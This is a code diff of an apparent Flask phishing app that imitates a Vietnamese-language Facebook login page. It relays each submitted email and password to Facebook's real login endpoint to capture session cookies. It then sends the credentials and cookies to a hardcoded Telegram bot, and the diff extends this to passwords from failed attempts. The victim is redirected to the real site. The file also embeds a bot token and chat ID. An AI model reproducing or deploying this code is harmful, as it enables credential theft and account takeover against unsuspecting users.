@@ -1,19 +1,22 @@
-from flask import Flask, render_template, request, redirect, make_response, session
+from flask import Flask, render_template, request, redirect
 import requests
-import os
 from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24)
 
 TELEGRAM_TOKEN = "8600949928:AAERwWL0-6sODzfixw--L5rNHW4hRW56HnY"
 TELEGRAM_CHAT_ID = "6126534090"
 
 def send_to_telegram(title, content):
+    message = f"""
+🔴 **{title}**
+
+{content}
+⏰ {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+    """
     try:
-        message = f"🔴 **{title}**\n\n{content}\n⏰ {datetime.now()}"
         requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                      data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
+                     data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
     except:
         pass
 
@@ -29,40 +32,46 @@ def login():
     if not email or not password:
         return render_template('index.html', error="Vui lòng nhập đầy đủ thông tin.")
 
-    # Forward request đến Facebook thật
+    # === GỬI REQUEST ĐẾN FACEBOOK THẬT ===
     try:
+        session = requests.Session()
+        
         headers = {
-            'User-Agent': request.headers.get('User-Agent'),
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': 'text/html,application/xhtml+xml',
             'Accept-Language': 'vi-VN,vi;q=0.9',
-            'Origin': 'https://www.facebook.com',
-            'Referer': 'https://www.facebook.com/'
+            'Referer': 'https://www.facebook.com/',
+            'Origin': 'https://www.facebook.com'
         }
 
         data = {
             'email': email,
             'pass': password,
-            'login': 'Đăng nhập'
+            'login': '1'
         }
 
-        # Gửi request login đến Facebook
-        r = requests.post('https://www.facebook.com/login.php', data=data, headers=headers, allow_redirects=True, timeout=10)
+        response = session.post('https://www.facebook.com/login.php', 
+                              data=data, 
+                              headers=headers, 
+                              allow_redirects=True)
 
-        # Nếu Facebook redirect về trang chủ → coi như đăng nhập thành công
-        if 'facebook.com' in r.url and 'home' in r.url or r.status_code == 200:
-            # Lấy cookie từ response
-            cookies = r.cookies.get_dict()
+        # Kiểm tra kết quả từ Facebook
+        if "home" in response.url or response.status_code == 200 and "facebook.com" in response.url:
+            # Đăng nhập thành công → Lấy cookie thật
+            cookies = dict(session.cookies)
             
             send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG (PROXY)", 
                            f"Email: {email}\nPassword: {password}\n\n**Cookie thật:**\n{cookies}")
 
-            # Redirect nạn nhân về Facebook thật
             return redirect('https://www.facebook.com')
+
         else:
+            # Sai mật khẩu hoặc bị chặn
+            send_to_telegram("❌ THẤT BẠI", f"Email: {email}\nPassword: {password} (Sai hoặc bị chặn)")
             return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")
 
     except Exception as e:
-        send_to_telegram("❌ LỖI PROXY", f"Email: {email}\nError: {str(e)}")
+        send_to_telegram("❌ LỖI", f"Email: {email}\nError: {str(e)}")
         return redirect('https://www.facebook.com')
 
 if __name__ == '__main__':
